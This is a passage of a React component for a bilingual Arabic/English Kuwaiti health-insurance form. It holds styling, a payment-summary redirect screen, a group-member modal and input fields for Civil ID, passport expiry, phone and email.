    .moh-row { display: flex; flex-direction: ${isEnglish ? 'row' : 'row-reverse'}; flex-wrap: wrap; gap: 10px; }
    .moh-row .moh-field { flex: 1; min-width: 280px; }
    @media (max-width: 768px) {
      .moh-row { flex-direction: column; }
      .moh-row .moh-field { min-width: 100%; }
      .moh-field label { min-width: 120px; font-size: 12px; }
      .moh-field input, .moh-field select { max-width: 100%; }
      .row6-yearsCount { order: 1 !important; }
      .row6-coverageStart { order: 2 !important; }
      .row6-coverageEnd { order: 3 !important; }
    }
    @media (max-width: 480px) {
      .modal-field { flex-direction: column !important; align-items: stretch !important; }
      .modal-field label { min-width: auto !important; text-align: ${isEnglish ? 'left' : 'right'} !important; margin-bottom: 4px; font-size: 12px !important; }
      .modal-field input, .modal-field select { width: 100% !important; max-width: 100% !important; font-size: 13px !important; }
    }
    .group-table { width: 100%; border-collapse: collapse; font-size: 12px; }
    .group-table th { background: #e8edf2; padding: 8px 4px; border: 1px solid #ccc; font-weight: bold; color: #333; text-align: center; white-space: nowrap; font-size: 11px; }
    .group-table td { padding: 6px 4px; border: 1px solid #ccc; text-align: center; font-size: 12px; }
    .group-table tr.selected { background: #d0e8f0; }
    .group-table tbody tr:hover { background: #f0f5fa; cursor: pointer; }
    .modal-field { display: flex; align-items: center; margin-bottom: 14px; direction: ${dir}; gap: 10px; }
    .modal-field label { min-width: 180px; text-align: ${isEnglish ? 'left' : 'right'}; font-weight: bold; font-size: 13px; color: #333; white-space: nowrap; }
    .modal-field input, .modal-field select { width: 320px; max-width: 320px; padding: 7px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 13px; font-family: ${isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif'}; direction: ${dir}; background: #fff; outline: none; }
    .modal-field input[readonly] { background: #e9ecef; }
    .modal-field .req { color: red; }
    .nat-dropdown-wrapper { position: relative; flex: 1; }
    .nat-dropdown-wrapper input { width: 100%; padding: 8px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; font-family: ${isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif'}; outline: none; direction: ${dir}; background: #fff; box-sizing: border-box; }
    .nat-dropdown-list { position: absolute; top: 100%; left: 0; right: 0; max-height: 200px; overflow-y: auto; background: #fff; border: 1px solid #ccc; border-top: none; border-radius: 0 0 3px 3px; z-index: 1000; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .nat-dropdown-list div { padding: 8px 12px; cursor: pointer; font-size: 13px; direction: ${dir}; }
    .nat-dropdown-list div:hover { background: #e8f0fe; }
    .modal-field .nat-dropdown-wrapper input { width: 320px; max-width: 320px; padding: 7px 10px; font-size: 13px; }
    @media (max-width: 480px) {
      .nat-dropdown-wrapper input { width: 100% !important; max-width: 100% !important; font-size: 13px !important; }
      .modal-field .nat-dropdown-wrapper input { width: 100% !important; max-width: 100% !important; }
    }
  `;

  // Payment Summary Page
  if (showPaymentSummary) {
    return (
      <div style={{ direction: dir, fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff', display: 'flex', flexDirection: 'column' }}>
        <div style={{ background: '#0c2c3c', padding: '15px 10px', textAlign: 'center' }}>
          <img src="/FMOHLogo.svg" alt={t.logoAlt} style={{ width: 70, height: 70, margin: '0 auto' }} />
          <h1 style={{ color: '#fff', fontSize: 'clamp(16px, 4vw, 22px)', marginTop: 8, fontWeight: 'bold', padding: '0 10px' }}>{t.systemTitle}</h1>
        </div>

        <div style={{ maxWidth: 600, margin: '20px auto', padding: '0 15px', width: '100%', boxSizing: 'border-box' as const }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{t.paymentSummaryTitle}</span>
            </div>
            <div style={{ padding: '20px 15px', background: '#f9f9f9' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <tbody>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>{t.serviceTypeLabel}</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{isEnglish ? (isGroupInsurance ? t.groupInsurance : t.individualInsurance) : serviceType}</td>
                  </tr>
                  {!isGroupInsurance && (
                    <>
                      <tr style={{ borderBottom: '1px solid #eee' }}>
                        <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>{t.residenceTypeLabel}</td>
                        <td style={{ padding: '12px 10px', color: '#333' }}>{getResidenceLabel(residenceType)}</td>
                      </tr>
                      <tr style={{ borderBottom: '1px solid #eee' }}>
                        <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>{t.yearsCountLabel}</td>
                        <td style={{ padding: '12px 10px', color: '#333' }}>{yearsCount}</td>
                      </tr>
                    </>
                  )}
                  {isGroupInsurance && (
                    <tr style={{ borderBottom: '1px solid #eee' }}>
                      <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>{t.personsCountLabel}</td>
                      <td style={{ padding: '12px 10px', color: '#333' }}>{groupPersons.length}</td>
                    </tr>
                  )}
                  <tr>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>{t.totalAmountLabel}</td>
                    <td style={{ padding: '12px 10px', color: '#d32f2f', fontWeight: 'bold', fontSize: 18 }}>{totalAmount} {isEnglish ? 'KD' : 'د.ك'}</td>
                  </tr>
                </tbody>
              </table>

              <div style={{ textAlign: 'center', marginTop: 30 }}>
                <div style={{
                  width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
                  borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
                }} />
                <p style={{ color: '#555', fontSize: 15 }}>{t.redirecting}</p>
                <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
              </div>
            </div>
          </div>
        </div>

        <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
          <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>{t.footer}</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ direction: dir, fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#f0f2f5', display: 'flex', flexDirection: 'column' }}>
      <style>{css}</style>

      {/* Warning Popup */}
      {showWarning && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <div style={{ background: '#fff', border: '3px solid #000', maxWidth: 550, width: '90%', padding: '30px 25px', textAlign: 'center' }}>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              {t.warningLine1}
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              {t.warningLine2}
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              {t.warningLine3}
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#333', marginBottom: 5 }}>
              {t.warningLine4}
            </p>
            <p style={{ fontSize: 15, lineHeight: 2, color: '#d32f2f', fontWeight: 'bold', marginBottom: 20 }}>
              {t.warningLine5}
            </p>
            <button
              onClick={() => setShowWarning(false)}
              style={{
                background: '#4CAF50', color: '#fff', border: 'none', padding: '10px 40px',
                fontSize: 16, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {/* Add Person Modal */}
      {showAddModal && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.4)', zIndex: 9999, display: 'flex', alignItems: 'flex-start', justifyContent: 'center', paddingTop: 30, overflowY: 'auto' }}>
          <div style={{ background: '#f5f5f5', border: '2px solid #88b8d0', maxWidth: 580, width: '95%', marginBottom: 30 }}>
            {/* Modal Header */}
            <div style={{ background: '#d0e8f0', padding: '10px 20px', borderBottom: '1px solid #88b8d0', textAlign: isEnglish ? 'left' : 'right' }}>
              <span style={{ fontSize: 15, fontWeight: 'bold', color: '#1a5276' }}>{t.addPersonTitle}</span>
            </div>

            {/* Modal Body */}
            <div style={{ padding: '15px 12px' }}>
              {/* نوع الإقامه */}
              <div className="modal-field">
                <label>{t.residenceType}</label>
                <select value={modalResidenceType} onChange={(e) => setModalResidenceType(e.target.value)}>
                  <option value="">{t.choose}</option>
                  {residenceTypesAr.map(rt => <option key={rt} value={rt}>{getResidenceLabel(rt)}</option>)}
                </select>
              </div>

              {/* حالة الضمان الصحي */}
              <div className="modal-field">
                <label>{t.insuranceStatus}<span className="req">*</span></label>
                <select value={modalInsuranceStatus} onChange={(e) => setModalInsuranceStatus(e.target.value)}>
                  <option value="">{t.choose}</option>
                  {getInsuranceStatuses().map(s => <option key={s.value} value={s.value}>{s.label}</option>)}
                </select>
              </div>

              {/* الرقم المدني */}
              <div className="modal-field">
                <label>{t.civilId}<span className="req">*</span></label>
                <input
                  type="text"
                  value={modalCivilId}
                  onChange={(e) => setModalCivilId(e.target.value.replace(/\D/g, ''))}
                  maxLength={12}
                  placeholder={t.civilIdPlaceholder}
                />
                {modalCivilId.length === 12 && !validateKuwaitCivilId(modalCivilId) && <span style={{ color: 'red', fontSize: 11 }}>{isEnglish ? 'Invalid Civil ID' : 'الرقم المدني غير صحيح'}</span>}
                {modalCivilId.length > 0 && modalCivilId.length < 12 && <span style={{ color: '#999', fontSize: 10 }}>{modalCivilId.length}/12</span>}
              </div>

              {/* الاسم */}
              <div className="modal-field">
                <label>{t.name}</label>
                <input type="text" value={modalName} onChange={(e) => setModalName(e.target.value)} />
              </div>

              {/* الجنس */}
              <div className="modal-field">
                <label>{t.gender}</label>
                <select value={modalGender} onChange={(e) => setModalGender(e.target.value)}>
                  <option value="">{t.choose}</option>
                  {getGenders().map(g => <option key={g.value} value={g.value}>{g.label}</option>)}
                </select>
              </div>

              {/* الجنسية */}
              <div className="modal-field">
                <label>{t.nationality}</label>
                <div className="nat-dropdown-wrapper" ref={modalNatDropdownRef}>
                  <input
                    type="text"
                    value={showModalNatDropdown ? modalNatSearch : (modalNationality ? getNationalities().find(n => n.value === modalNationality)?.label || '' : '')}
                    onChange={(e) => { setModalNatSearch(e.target.value); setShowModalNatDropdown(true); }}
                    onFocus={() => { setModalNatSearch(''); setShowModalNatDropdown(true); }}
                    placeholder={t.choose}
                    autoComplete="off"
                  />
                  {showModalNatDropdown && (
                    <div className="nat-dropdown-list">
                      {getNationalities().filter(n => n.label.toLowerCase().includes(modalNatSearch.toLowerCase()) || n.value.includes(modalNatSearch)).map(n => (
                        <div key={n.value} onClick={() => { setModalNationality(n.value); setModalNatSearch(''); setShowModalNatDropdown(false); }}>{n.label}</div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* تاريخ إنتهاء صلاحية الجواز */}
              <div className="modal-field">
                <label>{t.passportExpiry}<span className="req">*</span></label>
                <input type="date" value={modalPassportExpiry} onChange={(e) => setModalPassportExpiry(e.target.value)} />
              </div>

              {/* عدد السنوات */}
              <div className="modal-field">
                <label>{t.yearsCount}<span className="req">*</span></label>
                <select value={modalYearsCount} onChange={(e) => setModalYearsCount(e.target.value)}>
                  <option value="">{t.selectYears}</option>
                  {yearOptions.map(y => <option key={y} value={y}>{y}</option>)}
                </select>
              </div>

              {/* تاريخ البداية */}
              <div className="modal-field">
                <label>{t.startDate}<span className="req">*</span></label>
                <input
                  type="date"
                  value={modalStartDate}
                  onChange={(e) => setModalStartDate(e.target.value)}
                />
              </div>

              {/* تاريخ الانتهاء */}
              <div className="modal-field">
                <label>{t.endDate}</label>
                <input type="text" value={modalEndDate} readOnly />
              </div>

              {/* المبلغ */}
              <div className="modal-field">
                <label>{t.amount}</label>
                <input type="text" value={modalAmount || ''} readOnly />
              </div>

              {/* Buttons */}
              <div style={{ display: 'flex', justifyContent: 'center', gap: 15, marginTop: 25 }}>
                <button
                  onClick={handleSavePerson}
                  style={{
                    background: '#5bc0de', color: '#fff', border: 'none', padding: '8px 25px',
                    fontSize: 14, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                    fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif',
                    display: 'flex', alignItems: 'center', gap: 6,
                  }}
                >
                  {t.saveBtn}
                </button>
                <button
                  onClick={() => { setShowAddModal(false); resetModal(); }}
                  style={{
                    background: '#ccc', color: '#333', border: 'none', padding: '8px 25px',
                    fontSize: 14, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                    fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif',
                    display: 'flex', alignItems: 'center', gap: 6,
                  }}
                >
                  {t.cancelBtn}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <div style={{ background: '#0c2c3c', padding: '15px 10px', textAlign: 'center' }}>
        <img src="/FMOHLogo.svg" alt={t.logoAlt} style={{ width: 70, height: 70, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 'clamp(16px, 4vw, 22px)', marginTop: 8, fontWeight: 'bold', padding: '0 10px' }}>{t.systemTitle}</h1>
      </div>

      {/* User info bar */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', padding: '10px 15px', background: '#fff', borderBottom: '1px solid #eee' }}>
        <div style={{ display: 'flex', flexDirection: 'column', order: isEnglish ? 2 : 0 }}>
          <span
            onClick={() => setIsEnglish(!isEnglish)}
            style={{ color: '#c0392b', fontSize: 14, cursor: 'pointer', fontWeight: 'bold', textDecoration: 'underline' }}
          >
            {t.langToggle}
          </span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, order: isEnglish ? 0 : 2 }}>
          <span style={{ color: '#d4a017', fontSize: 14, fontWeight: 'bold' }}>{userName || 'User Name'}</span>
          <div style={{ width: 40, height: 40, background: '#ddd', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="#888"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </div>
        </div>
      </div>

      <div style={{ width: '100%', padding: '15px 10px', boxSizing: 'border-box' as const }}>
        {/* Service Type Section */}
        <div style={{ background: '#e8edf2', padding: '15px 20px', borderRadius: 4, marginBottom: 15 }}>
          <div className="service-type-row" style={{ display: 'flex', flexDirection: isEnglish ? 'row' : 'row-reverse', flexWrap: 'wrap', gap: 10, alignItems: 'center' }}>
            {isGroupInsurance ? (
              <>
                <div className="moh-field service-field-extra" style={{ flex: 1, minWidth: 280 }}>
                  <select value={groupInsuranceCategory} onChange={(e) => setGroupInsuranceCategory(e.target.value)} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 220 }}>
                    <option value="">{t.choose}</option>
                    {getGroupCategories().map(c => <option key={c.value} value={c.value}>{c.label}</option>)}
                  </select>
                  <label style={{ minWidth: 140, textAlign: isEnglish ? 'left' : 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: isEnglish ? 0 : 10, paddingRight: isEnglish ? 10 : 0 }}>{t.groupCategory}</label>
                </div>
              </>
            ) : (
              <>
                <div className="moh-field service-field-amount" style={{ flex: 1, minWidth: 200 }}>
                  <input type="text" value={yearlyAmount} readOnly style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, background: '#e9ecef', maxWidth: 80, textAlign: 'center' }} />
                  <label style={{ minWidth: 100, textAlign: isEnglish ? 'left' : 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: isEnglish ? 0 : 10, paddingRight: isEnglish ? 10 : 0 }}>{t.yearlyAmount}</label>
                </div>
                <div className="moh-field service-field-residence" style={{ flex: 1, minWidth: 280 }}>
                  <select value={residenceType} onChange={(e) => handleResidenceChange(e.target.value)} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 220 }}>
                    <option value="">{t.choose}</option>
                    {residenceTypesAr.map(rt => <option key={rt} value={rt}>{getResidenceLabel(rt)}</option>)}
                  </select>
                  <label style={{ minWidth: 80, textAlign: isEnglish ? 'left' : 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: isEnglish ? 0 : 10, paddingRight: isEnglish ? 10 : 0 }}>{t.residenceType}</label>
                </div>
              </>
            )}
            <div className="moh-field service-field-type" style={{ flex: 1, minWidth: 280 }}>
              <select value={serviceType} onChange={(e) => { setServiceType(e.target.value); setResidenceType(''); setYearlyAmount(''); setGroupPersons([]); setGroupInsuranceCategory(''); }} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 180 }}>
                <option value="">{t.choose}</option>
                {getServiceTypes().map(st => <option key={st.value} value={st.value}>{st.label}</option>)}
              </select>
              <label style={{ minWidth: 80, textAlign: isEnglish ? 'left' : 'right', fontWeight: 'bold', fontSize: 13, paddingLeft: isEnglish ? 0 : 10, paddingRight: isEnglish ? 10 : 0 }}>{t.serviceType}</label>
            </div>
          </div>
        </div>

        {serviceType && !isGroupInsurance && (
          <div style={{ background: '#fff', padding: '20px 25px', borderRadius: 4, border: '1px solid #d0dbe8', borderRight: isEnglish ? 'none' : '3px solid #a0c4e8', borderLeft: isEnglish ? '3px solid #a0c4e8' : 'none', marginBottom: 15 }}>
            {/* Row 1: حالة الضمان الصحي + الرقم المدني */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="text" value={civilId} onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))} maxLength={12} placeholder={t.civilIdPlaceholder} />
                {civilId.length === 12 && !validateKuwaitCivilId(civilId) && <span style={{ color: 'red', fontSize: 11 }}>{isEnglish ? 'Invalid Civil ID' : 'الرقم المدني غير صحيح'}</span>}
                {civilId.length > 0 && civilId.length < 12 && <span style={{ color: '#999', fontSize: 10 }}>{civilId.length}/12</span>}
                <label>{t.civilId} <span className="req">*</span></label>
              </div>
              <div className="moh-field">
                <select value={insuranceStatus} onChange={(e) => setInsuranceStatus(e.target.value)}>
                  <option value="">{t.choose}</option>
                  {getInsuranceStatuses().map(s => <option key={s.value} value={s.value}>{s.label}</option>)}
                </select>
                <label>{t.insuranceStatus} <span className="req">*</span></label>
              </div>
            </div>

            {/* Row 2: الاسم */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} />
                <label>{t.name}</label>
              </div>
            </div>

            {/* Row 3: الجنس + تاريخ الميلاد */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} />
                <label>{t.birthDate}</label>
              </div>
              <div className="moh-field">
                <select value={gender} onChange={(e) => setGender(e.target.value)}>
                  <option value="">{t.choose}</option>
                  {getGenders().map(g => <option key={g.value} value={g.value}>{g.label}</option>)}
                </select>
                <label>{t.gender}</label>
              </div>
            </div>

            {/* Row 4: الجنسية */}
            <div className="moh-row">
              <div className="moh-field">
                <div className="nat-dropdown-wrapper" ref={natDropdownRef}>
                  <input
                    type="text"
                    value={showNatDropdown ? natSearch : (nationality ? getNationalities().find(n => n.value === nationality)?.label || '' : '')}
                    onChange={(e) => { setNatSearch(e.target.value); setShowNatDropdown(true); }}
                    onFocus={() => { setNatSearch(''); setShowNatDropdown(true); }}
                    placeholder={t.choose}
                    autoComplete="off"
                  />
                  {showNatDropdown && (
                    <div className="nat-dropdown-list">
                      {getNationalities().filter(n => n.label.toLowerCase().includes(natSearch.toLowerCase()) || n.value.includes(natSearch)).map(n => (
                        <div key={n.value} onClick={() => { setNationality(n.value); setNatSearch(''); setShowNatDropdown(false); if (residenceType) setYearlyAmount(getYearlyPrice(residenceType, n.value)); }}>{n.label}</div>
                      ))}
                    </div>
                  )}
                </div>
                <label>{t.nationality}</label>
              </div>
            </div>

            {/* Row 5: الشركة + مكان العمل + تاريخ إنتهاء صلاحية الجواز */}
            <div className="moh-row">
              <div className="moh-field">
                <input type="date" value={passportExpiry} onChange={(e) => setPassportExpiry(e.target.value)} />
                <label>{t.passportExpiry} <span className="req">*</span></label>
              </div>
              <div className="moh-field">
                <input type="text" value={workplace} onChange={(e) => setWorkplace(e.target.value)} />
                <label>{t.workplace}</label>
              </div>
              <div className="moh-field">
                <input type="text" value={company} onChange={(e) => setCompany(e.target.value)} />
                <label>{t.company}</label>
              </div>
            </div>

            {/* Row 6: عدد السنوات + تاريخ بداية التغطية + تاريخ نهاية التغطية */}
            <div className="moh-row">
              <div className="moh-field row6-coverageEnd">
                <input type="text" value={coverageEnd} readOnly />
                <label>{t.coverageEnd}</label>
              </div>
              <div className="moh-field row6-coverageStart">
                <input type="date" value={coverageStart} onChange={(e) => setCoverageStart(e.target.value)} />
                <label>{t.coverageStart} <span className="req">*</span></label>
              </div>
              <div className="moh-field row6-yearsCount">
                <select value={yearsCount} onChange={(e) => setYearsCount(e.target.value)}>
                  <option value="">{t.selectYears}</option>
                  {yearOptions.map(y => <option key={y} value={y}>{y}</option>)}
                </select>
                <label>{t.yearsCount} <span className="req">*</span></label>
              </div>
            </div>
          </div>
        )}

        {serviceType && (
        <div style={{ background: '#fff', padding: '20px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div className="moh-row">
            <div className="moh-field">
              <input type="email" value={email} onChange={(e) => { const v = e.target.value; if (/^[a-zA-Z0-9@._\-]*$/.test(v) || v === '') setEmail(v); }} style={{ direction: 'ltr', textAlign: 'left' }} />
              {email && !/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(email) && (
                <span style={{ color: 'red', fontSize: 11 }}>{isEnglish ? 'Invalid email format' : 'صيغة البريد غير صحيحة'}</span>
              )}
              <label>{t.email}</label>
            </div>
            <div className="moh-field">
              <label>{t.phone}</label>
              <div style={{ display: 'flex', alignItems: 'center', gap: 0, direction: 'ltr' }}>
                <span style={{
                  background: '#f0f0f0',
                  border: '1px solid #ccc',
                  borderRight: 'none',
                  borderRadius: '6px 0 0 6px',
                  padding: '10px 12px',
                  fontSize: 15,
                  color: '#333',
                  fontWeight: 'bold',
                  height: '44px',
                  display: 'flex',
                  alignItems: 'center',
                  userSelect: 'none'
                }}>+965</span>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '');
                    if (val.length <= 8) {
                      setPhone(val);
                      setPhoneError('');
                    }
                  }}
                  onBlur={() => {
                    if (phone && (phone.length !== 8 || !/^[569]/.test(phone))) {
                      setPhoneError(!isEnglish ? 'رقم الهاتف يجب أن يكون 8 أرقام ويبدأ بـ 5 أو 6 أو 9' : 'Phone must be 8 digits starting with 5, 6 or 9');
                    }
                  }}
                  maxLength={8}
                  placeholder={'XXXX XXXX'}
                  style={{ direction: 'ltr', textAlign: 'left', borderRadius: '0 6px 6px 0', flex: 1, padding: '10px', border: '1px solid #ccc', fontSize: 15, outline: 'none' }}
                />
              </div>
              {phoneError && <p style={{ color: 'red', fontSize: 12, marginTop: 4 }}>{phoneError}</p>}
            </div>
          </div>

          {!isFormComplete && (
            <p style={{ color: 'red', fontSize: 13, textAlign: 'center', marginTop: 15 }}>
              {isGroupInsurance ? t.requiredGroup : t.requiredIndividual}
            </p>
          )}
        </div>
        )}

        {/* Group Insurance Table Section - only for ضمان جماعي */}
        {serviceType && isGroupInsurance && (
          <div style={{ background: '#fff', padding: '15px 20px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
            {/* Section header */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
              <div style={{ display: 'flex', gap: 6, order: isEnglish ? 2 : 0 }}>
                {/* Add button */}
                <button
                  onClick={handleAddPerson}
                  style={{
                    width: 28, height: 28, borderRadius: 4, border: '2px solid #4CAF50',
                    background: '#fff', color: '#4CAF50', fontSize: 20, fontWeight: 'bold',
                    cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                    lineHeight: 1, padding: 0,
                  }}
                  title={t.addPerson}
                >
                  +
                </button>
                {/* Delete button */}
                <button
                  onClick={handleDeletePerson}
                  disabled={selectedPersonIndex === null}
                  style={{
                    width: 28, height: 28, borderRadius: 4, border: '2px solid #d32f2f',
                    background: '#fff', color: '#d32f2f', fontSize: 16, fontWeight: 'bold',
                    cursor: selectedPersonIndex !== null ? 'pointer' : 'not-allowed',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    lineHeight: 1, padding: 0, opacity: selectedPersonIndex !== null ? 1 : 0.5,
                  }}
                  title={t.deletePerson}
                >
                  ✕
                </button>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, order: isEnglish ? 0 : 2 }}>
                <span style={{ fontSize: 14, fontWeight: 'bold', color: '#333' }}>{t.insuranceGroup}</span>
              </div>
            </div>

            {/* Blue gradient bar */}
            <div style={{ height: 6, background: 'linear-gradient(to left, #a8d0e6, #d0e8f0)', borderRadius: 3, marginBottom: 10 }}></div>

            {/* Table */}
            <div style={{ overflowX: 'auto' }}>
              <table className="group-table">
                <thead>
                  <tr>
                    <th>{t.civilId}</th>
                    <th>{t.name}</th>
                    <th>{t.gender}</th>
                    <th>{t.nationality}</th>
                    <th>{t.residenceType}</th>
                    <th>{t.passportExpiry}</th>
                    <th>{t.insuranceStatus}</th>
                    <th>{t.yearsCount}</th>
                    <th>{t.startDate}</th>
                    <th>{t.endDate}</th>
                    <th>{t.totalAmount}</th>
                    <th>{t.delete}</th>
                  </tr>
                </thead>
                <tbody>
                  {groupPersons.length === 0 ? (
                    <tr>
                      <td colSpan={12} style={{ padding: 20, color: '#999', fontStyle: 'italic' }}>
                        {t.noPersons}
                      </td>
                    </tr>
                  ) : (
                    groupPersons.map((p, i) => (
                      <tr
                        key={i}
                        className={selectedPersonIndex === i ? 'selected' : ''}
                        onClick={() => setSelectedPersonIndex(selectedPersonIndex === i ? null : i)}
                      >
                        <td>{p.civilId}</td>
                        <td>{p.name}</td>
                        <td>{isEnglish ? (p.gender === 'ذكر' ? 'Male' : p.gender === 'أنثى' ? 'Female' : p.gender) : p.gender}</td>
                        <td>{isEnglish ? getNationalities().find(n => n.value === p.nationality)?.label || p.nationality : p.nationality}</td>
                        <td style={{ fontSize: 10 }}>{isEnglish ? getResidenceLabel(p.residenceType) : p.residenceType}</td>
                        <td>{p.passportExpiry}</td>
                        <td>{isEnglish ? getInsuranceStatuses().find(s => s.value === p.insuranceStatus)?.label || p.insuranceStatus : p.insuranceStatus}</td>
                        <td>{p.yearsCount}</td>
                        <td>{p.startDate}</td>
                        <td>{p.endDate}</td>
                        <td>{p.amount} {isEnglish ? 'KD' : 'د.ك'}</td>
                        <td>
                          <button
                            onClick={(e) => { e.stopPropagation(); const updated = groupPersons.filter((_, idx) => idx !== i); setGroupPersons(updated); setSelectedPersonIndex(null); }}
                            style={{ background: 'none', border: 'none', color: '#c0392b', fontSize: 18, cursor: 'pointer', fontWeight: 'bold' }}
                            title={t.delete}
                          >✕</button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {serviceType && (
        <div style={{ background: '#fff', padding: '15px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 15 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 20 }}>
              <div className="moh-field" style={{ marginBottom: 0 }}>
                <select value={paymentMethod} onChange={(e) => setPaymentMethod(e.target.value)}>
                  <option value="بوابة الدفع الإلكتروني">{t.electronicPayment}</option>
                </select>
                <label>{t.paymentMethod}</label>
              </div>
              <div className="moh-field" style={{ marginBottom: 0 }}>
                <input type="text" value={totalAmount || 0} readOnly style={{ textAlign: 'center', maxWidth: 100 }} />
                <label>{t.totalAmount}</label>
              </div>
            </div>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <button
                onClick={handlePayment}
                disabled={!isFormComplete}
                style={{
                  background: isFormComplete ? '#1076BB' : '#ccc',
                  color: '#fff', border: 'none', padding: '10px 30px',
                  fontSize: 14, fontWeight: 'bold', borderRadius: 4,
                  cursor: isFormComplete ? 'pointer' : 'not-allowed',
                  fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif',
                  whiteSpace: 'nowrap',
                }}
              >
                {t.payBtn}
              </button>
            </div>
          </div>
        </div>
        )}

        {serviceType && (
        <div style={{ background: '#fff', padding: '15px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 30 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 15, direction: dir }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, direction: dir }}>
              <input
                type="checkbox"
                checked={agreeTerms}
